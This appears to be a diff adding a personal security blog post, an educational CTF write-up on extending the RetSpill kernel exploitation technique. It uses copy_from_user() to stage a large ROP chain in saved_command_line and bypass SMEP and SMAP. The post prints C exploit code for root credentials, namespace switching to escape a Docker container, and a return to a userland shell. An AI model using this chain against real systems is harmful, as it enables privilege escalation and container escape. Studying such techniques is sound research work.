@@ -1,0 +1,434 @@
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Making RetSpill More Powerful — Zereza's Blog</title>
+  <meta name="description" content="Blog de ciberseguridad. Writeups, notas técnicas e investigación.">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23000000'/><rect x='1' y='1' width='30' height='30' fill='none' stroke='%2300FF00' stroke-width='2'/><text x='5' y='23' font-family='monospace' font-size='16' fill='%2300FF00'>&gt;_</text></svg>">
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Making RetSpill More Powerful | Zereza’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Making RetSpill More Powerful" />
+<meta name="author" content="Miguel Peñaranda" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Going from limited code execution to a much more powerful primitive" />
+<meta property="og:description" content="Going from limited code execution to a much more powerful primitive" />
+<link rel="canonical" href="http://0.0.0.0:4000/en/posts/retspill-2/" />
+<meta property="og:url" content="http://0.0.0.0:4000/en/posts/retspill-2/" />
+<meta property="og:site_name" content="Zereza’s Blog" />
+<meta property="og:image" content="http://0.0.0.0:4000/assets/img/posts/retspillV2/retspillV2_post.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-07-12T00:00:00+02:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://0.0.0.0:4000/assets/img/posts/retspillV2/retspillV2_post.jpeg" />
+<meta property="twitter:title" content="Making RetSpill More Powerful" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Miguel Peñaranda"},"dateModified":"2026-07-12T00:00:00+02:00","datePublished":"2026-07-12T00:00:00+02:00","description":"Going from limited code execution to a much more powerful primitive","headline":"Making RetSpill More Powerful","image":"http://0.0.0.0:4000/assets/img/posts/retspillV2/retspillV2_post.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/en/posts/retspill-2/"},"url":"http://0.0.0.0:4000/en/posts/retspill-2/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+
+<nav class="nav">
+  <div class="nav__inner">
+    <a href="/en/" class="nav__logo">
+      <span class="nav__logo-prompt">~$</span>
+      Zereza's Blog<span class="nav__logo-cursor">_</span>
+    </a>
+    <ul class="nav__links" id="nav-links">
+      <li><a href="/en/" >home</a></li>
+      <li><a href="/en/about/" >whoami</a></li>
+      <li><a href="/en/posts/" class="active">posts</a></li>
+      <li><a href="/en/challenges/" >challenges</a></li>
+    </ul>
+    <div class="nav__tools">
+      <div class="lang-switch" aria-label="Language switcher">
+        <a href="/posts/retspill-2/" >ES</a>
+        <a href="/en/posts/retspill-2/" class="active">EN</a>
+      </div>
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener" class="nav__cta">github ↗</a>
+    </div>
+    <button class="nav__burger" onclick="document.getElementById('nav-links').classList.toggle('open')">≡</button>
+  </div>
+</nav>
+
+<main>
+
+
+<div class="page page--with-toc">
+  <aside class="toc-sidebar" id="toc-sidebar">
+    <div class="toc-sidebar__inner">
+      <span class="toc-sidebar__title">Contents</span>
+      <nav class="toc-nav" id="toc-nav"></nav>
+    </div>
+  </aside>
+
+  <article class="post-wrap">
+
+    <a href="/en/posts/" class="post-back">← volver a posts</a>
+
+    <header class="post-header">
+      <div class="post-header-tags">
+        
+        <span class="post-tag tag-kernel">Kernel</span>
+        
+      </div>
+      <h1>Making RetSpill More Powerful</h1>
+      <div class="post-header-meta">
+        
+        <span>July 12, 2026</span>
+        
+        
+      </div>
+    </header>
+
+    
+    <div class="post-cover">
+      <img src="/assets/img/posts/retspillV2/retspillV2_post.jpeg" alt="Making RetSpill More Powerful">
+    </div>
+    
+
+    <div class="prose" id="prose-content">
+      <h2 id="tldr">TL;DR</h2>
+<p><a href="https://mzereza.github.io/en/posts/kernel-retspill/">RetSpill</a> is a kernel exploitation technique in which an attacker turns a Control Flow Hijack into, traditionally, a fairly limited ROP.</p>
+
+<p>In this post I’ll talk about how to turn that limited ROP into unrestricted code execution while bypassing SMEP and SMAP.</p>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>I was reinforcing my kernel exploitation knowledge by solving old CTF challenges.</p>
+
+<p>I came across <a href="https://syst3mfailure.io/corjail/">CorJail</a>, a challenge where you abuse an Off-By-Null on the Heap to reach a Docker escape.</p>
+
+<p>My approach was quite different from the original writeup. I used the <a href="https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf">PageJack</a> technique, overflowing a Null-Byte into a <em>pipe_buffer</em> structure to get a UaF on a Physical Page, and then overwriting a <em>seq_operations</em> structure to gain a Control Flow Hijack.</p>
+
+<p>From there I would pivot using <a href="https://mzereza.github.io/en/posts/kernel-retspill/">RetSpill</a>, a technique I had used in previous challenges to achieve LPE.</p>
+
+<p>The problem is that in this challenge I don’t just need LPE, I need to escape a Docker container. That means I need a bigger ROP Chain than the one I can (at first glance) get with RetSpill.</p>
+
+<h2 id="recalling-retspill">Recalling RetSpill</h2>
+
+<p>RetSpill takes advantage of the fact that the kernel writes user-controlled data from Userland (such as the registers before making a syscall) onto the Stack.</p>
+
+<p>If we have a Control Flow Hijack primitive we can use an <code class="language-plaintext highlighter-rouge">add rsp+X; ret</code> gadget to pivot to this portion of the Stack that we control.</p>
+
+<p>The problem is that when pivoting to the <em>pt_regs</em> structure on the Stack (where our registers are saved) we can only write 0x48 bytes (9 registers).</p>
+
+<p>That fell short for escaping a Docker container, since I normally write my ROP Chain across 8 registers and return to userland using the <a href="https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork">Telefork</a> technique. That ROP Chain would look something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>pop rdi; ret
+init_cred
+commit_creds
+pop rdi; ret
+// Some junk value in the kernel
+pop rsi; ret
+// Some junk value in the kernel
+do_sys_fork
+msleep
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="making-retspill-more-powerful">Making RetSpill More Powerful</h2>
+
+<p>The bottleneck is clear: I don’t have a write primitive that’s strong enough.</p>
+
+<p>I can’t pivot to a ROP Chain in userland because SMAP is enabled. I also can’t redirect execution to userland because SMEP is enabled too.</p>
+
+<p>I felt like I was banging my head against a wall…</p>
+
+<p>Thinking about how the kernel legally accesses userland data, using <em>copy_from_user()</em>, an idea came to me: what if I make the RetSpill ROP execute a <em>copy_from_user()</em> of my Real ROP into a part of the BSS, and then pivot to it?</p>
+
+<p>And indeed, it could be done in 9 gadgets ;)</p>
+
+<p><img src="/assets/img/posts/retspillV2/retspillv2-scheme.png" alt="Diagram" /></p>
+
+<h2 id="getting-to-work">Getting to Work</h2>
+
+<p>Now all that’s left is to choose which part of the BSS to copy our ROP Chain into. At first I thought of modprobe_path, but it wasn’t big enough for my ROP Chain; at some point it would overwrite other critical structures.</p>
+
+<p>While researching I discovered <em>saved_command_line</em>, a structure in the BSS that stores the command line passed to the kernel at boot. It’s the variable you read through <em>/proc/cmdline</em>. It’s the perfect candidate: the variable has a size of 0x1000 bytes, so you can write a fairly large ROP.</p>
+
+<p>Basically we do something like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">copy_from_user</span><span class="p">(</span><span class="n">saved_command_line</span><span class="p">,</span> <span class="n">our_buffer</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span><span class="n">saved_command_line</span><span class="p">)();</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>My code for the challenge was this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">prepare_ropchain</span><span class="p">(</span><span class="n">ulong</span><span class="o">*</span> <span class="n">ropbuf</span><span class="p">,</span> <span class="n">ulong</span> <span class="n">kern_addr</span><span class="p">){</span>
+  <span class="n">ulong</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RDI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">INIT_CRED</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">COMMIT_CREDS</span><span class="p">;</span>
+ 
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RDI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">FIND_TASK_BY_VPID</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RDX_RET</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">MOV_RCX_RAX</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">MOV_RDI_RCX_SUB_RDI_RDX</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RSI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">INIT_NSPROXY</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">SWITCH_NAMESPACES</span><span class="p">;</span>
+
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RDI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">INIT_FS</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">COPY_FS_STRUCT</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">PUSH_RAX_POP_RBX</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RDI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">FIND_TASK_BY_VPID</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RSI</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6e0</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">ADD_RAX_RSI_RET</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">MOV_QWORD_PTR_RAX_RBX_POP_RBX</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">KPTI_TRAMPOLINE</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+  <span class="n">ropbuf</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="n">ulong</span> <span class="n">rbp_fake</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">trigger_retspill</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">ulong</span> <span class="n">kern_addr</span><span class="p">){</span>
+
+  <span class="n">ulong</span> <span class="n">ropbuf</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
+  <span class="n">prepare_ropchain</span><span class="p">(</span><span class="n">ropbuf</span><span class="p">,</span> <span class="n">kern_addr</span><span class="p">);</span>
+
+  <span class="c1">// OFFSET TO PT_REGS 0x160</span>
+
+  <span class="n">ulong</span> <span class="n">r9</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span> <span class="n">POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r10</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">SAVED_COMMAND_LINE</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r11</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">ropbuf</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r12</span> <span class="o">=</span> <span class="mi">288</span><span class="p">;</span>
+  <span class="n">rbp_fake</span> <span class="o">=</span> <span class="mh">0x5252525252525252</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rbx</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RCX_RET</span><span class="p">;</span>
+  <span class="c1">// Some junk 0x8 data between rbx and r14</span>
+  <span class="n">ulong</span> <span class="n">r14</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">COPY_FROM_USER</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r15</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">POP_RSP_RET</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">r8</span> <span class="o">=</span> <span class="n">kern_addr</span><span class="o">+</span><span class="n">SAVED_COMMAND_LINE</span><span class="p">;</span>
+
+  <span class="c1">// NOT LOADED INTO PT_REGS</span>
+  <span class="n">ulong</span> <span class="n">r13</span> <span class="o">=</span> <span class="mh">0x4646464646464646</span><span class="p">;</span>
+  <span class="n">ulong</span> <span class="n">rcx</span> <span class="o">=</span> <span class="mh">0x5050505050505050</span><span class="p">;</span>
+
+  
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="n">__asm__</span> <span class="k">volatile</span><span class="p">(</span>
+      <span class="s">".intel_syntax noprefix</span><span class="se">\n</span><span class="s">"</span>
+      <span class="s">"mov [rbp_fake], rbp</span><span class="se">\n</span><span class="s">"</span>
+      <span class="s">"mov rbp, 0x5252525252525252</span><span class="se">\n</span><span class="s">"</span>
+      <span class="s">"syscall</span><span class="se">\n</span><span class="s">"</span>
+      <span class="s">"mov rbp, [rbp_fake]</span><span class="se">\n</span><span class="s">"</span>
+      <span class="s">".att_syntax prefix"</span>
+      <span class="o">:</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r8</span><span class="p">),</span> <span class="s">"+r"</span><span class="p">(</span><span class="n">r9</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r10</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r11</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r12</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r13</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r14</span><span class="p">),</span><span class="s">"+r"</span><span class="p">(</span><span class="n">r15</span><span class="p">),</span>
+        <span class="s">"+b"</span><span class="p">(</span><span class="n">rbx</span><span class="p">),</span> <span class="s">"+c"</span><span class="p">(</span><span class="n">rcx</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"D"</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="s">"S"</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="s">"d"</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="s">"a"</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+      <span class="o">:</span> <span class="s">"memory"</span>
+      <span class="p">);</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>With this technique we go from having a single Control Flow Hijack to having an arbitrary write and arbitrary code execution primitive.</p>
+
+<p>This opens many doors in Kernel exploitation, since we achieve a very powerful primitive from a single RIP control while bypassing SMEP and SMAP.</p>
+
+<p>(Note: a KASLR leak is required)</p>
+
+<hr />
+
+<h2 id="references">References</h2>
+<ul>
+  <li>Original paper: <a href="https://adamdoupe.com/publications/retspill-ccs2023.pdf">https://adamdoupe.com/publications/retspill-ccs2023.pdf</a></li>
+  <li>Previous post about RetSpill <a href="https://mzereza.github.io/en/posts/kernel-retspill/">https://mzereza.github.io/en/posts/kernel-retspill/</a></li>
+</ul>
+
+    </div>
+
+    <nav class="post-nav">
+      
+      <a href="/en/posts/kernel-retspill/" class="post-nav-link">
+        <span class="post-nav-dir">← anterior</span>
+        <span class="post-nav-title">RetSpill: From Kernel CFH to LPE</span>
+      </a>
+      
+
+      <span></span>
+    </nav>
+
+  </article>
+</div>
+
+<script>
+(function() {
+  var prose = document.getElementById('prose-content');
+  var nav   = document.getElementById('toc-nav');
+  if (!prose || !nav) return;
+
+  var headings = prose.querySelectorAll('h2, h3');
+  if (headings.length === 0) return;
+
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function(h, i) {
+    if (!h.id) {
+      h.id = 'toc-' + i + '-' + h.textContent.trim().toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+    }
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-item--' + h.tagName.toLowerCase();
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.className = 'toc-link';
+    a.textContent = h.textContent;
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  /* Active link highlight on scroll */
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function(l) { l.classList.remove('toc-link--active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('toc-link--active');
+      }
+    });
+  }, { rootMargin: '0px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(function(h) { observer.observe(h); });
+})();
+</script>
+</main>
+
+<footer class="footer">
+  <div class="footer__inner">
+    <div class="footer__brand">
+      <span class="nav__logo-prompt">~$</span> Zereza's Blog
+    </div>
+    <div class="footer__links">
+      <a href="https://github.com/mzereza" target="_blank" rel="noopener">github</a>
+      <span class="footer__sep">/</span> <a href="https://linkedin.com/in/miguel-t-pe%C3%B1aranda-padilla-227076372" target="_blank" rel="noopener">linkedin</a>
+      <span class="footer__sep">/</span> <a href="mailto:mig.penaranda07@gmail.com">email</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
